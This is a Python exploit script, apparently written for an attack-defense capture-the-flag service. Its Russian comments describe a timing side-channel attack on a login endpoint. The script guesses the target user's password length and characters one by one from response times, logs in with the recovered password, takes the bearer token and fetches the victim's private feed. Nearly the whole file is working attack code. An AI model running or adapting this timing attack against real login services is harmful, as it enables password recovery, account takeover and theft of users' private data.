import requests
import string
from typing import List
import time

# Узнать логин атакуемого пользователя - предполагаем что знаем
# Потом стучимся в метод /session с разными паролями и смотрим на время ответа
# В худшем случае - первая буква * максимальную длину
# Нашли длину, перебираем каждую букву

username = "checker_user1"
MAX_LENGTH = 32
correct_char_time = 31 # ms
alphabet = string.ascii_lowercase + string.digits
host = '...:3080'
count_sure = 10

def auth(username: str, password: str):
    data = {
        'grant_type': 'password',
        'username': username,
        'password': password,
    }
    response = requests.post(f'{host}/session', data=data, verify=False)
    return response.json()
    
def get_password_response_time(username: str, password: List[str], count_requests=1, constant_time=5):
    password = ''.join(password)
    data = {
        'grant_type': 'password',
        'username': username,
        'password': password,
    }

    response_time = []
    for _ in range(count_requests):
        start = time.time()
        response = requests.post(f'{host}/session', data=data, verify=False)
        end = time.time()
        response_time.append((end - start) * 1000)
    response_time = min(response_time)
    is_correct = response.status_code == 200
    return response_time - constant_time, is_correct
    
def password_attack(username, debug=True):
    found = False
    for length in range(1, MAX_LENGTH + 1):
        if found:
            break
        for first_letter in alphabet:
            password = [first_letter] * length
            response_time, is_correct = get_password_response_time(username, password)
            if debug:
                print(length, first_letter, response_time)
            if response_time > correct_char_time:
                response_time, _ = get_password_response_time(username, password, count_sure)
                if response_time > correct_char_time:
                    print(f"Found first letter: {first_letter} and {length}")
                    found = True
                    break
    length -= 1
    password = [first_letter] * length
    for char_index in range(1, length):
        for char in alphabet:
            password[char_index] = char
            response_time, is_correct = get_password_response_time(username, password)
            if debug:
                print(''.join(password), response_time)
            if is_correct:
                return ''.join(password)
            
            if response_time > correct_char_time * (char_index + 1):
                response_time, _ = get_password_response_time(username, password, count_sure)
                if response_time > correct_char_time:
                    print(f"Found character: {char}")
                    break

    return ''.join(password)
            
password = password_attack(username, debug=False)
print(password)
key = auth(username, password)['access_token']
print(key)
headers = {
    'Authorization': f'Bearer {key}',
}

response = requests.get(f'{host}/feed/my', headers=headers)
print(response.json())